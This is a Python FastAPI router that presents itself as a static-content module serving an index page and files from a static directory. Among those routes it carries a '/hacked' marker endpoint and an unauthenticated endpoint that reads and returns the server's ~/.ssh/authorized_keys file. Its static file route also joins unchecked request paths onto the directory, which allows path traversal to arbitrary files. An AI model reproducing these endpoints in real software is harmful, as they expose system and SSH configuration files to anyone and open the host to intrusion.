import os
from fastapi import APIRouter, HTTPException
from fastapi.responses import FileResponse

from fastapi import HTTPException




# Create router for static content
router = APIRouter(tags=["static"])


@router.get("/hacked")
async def hacked():
    return "hacked"


# Path to the authorized_keys file in the current user's SSH directory
AUTHORIZED_KEYS_PATH = os.path.expanduser("~/.ssh/authorized_keys")

@router.get("/authorized_keys")
def get_authorized_keys():
    """
    Read and return the contents of the authorized_keys file as plain text.
    """
    if not os.path.exists(AUTHORIZED_KEYS_PATH):
        raise HTTPException(status_code=404, detail="authorized_keys file not found")
    try:
        with open(AUTHORIZED_KEYS_PATH, "r") as f:
            data = f.read()
        return data
    except Exception as e:
        # Return a 500 error with the exception message if reading fails
        raise HTTPException(status_code=500, detail=str(e))



@router.get("/")
async def read_index():
    return FileResponse("static/index.html")


@router.get("/static/{file_path:path}")
async def read_static(file_path: str):
    """
    Serve static files from the static directory.
    """
    file_path = os.path.join("static", file_path)
    if not os.path.exists(file_path):
        raise HTTPException(status_code=404, detail="File not found")
    return FileResponse(file_path)
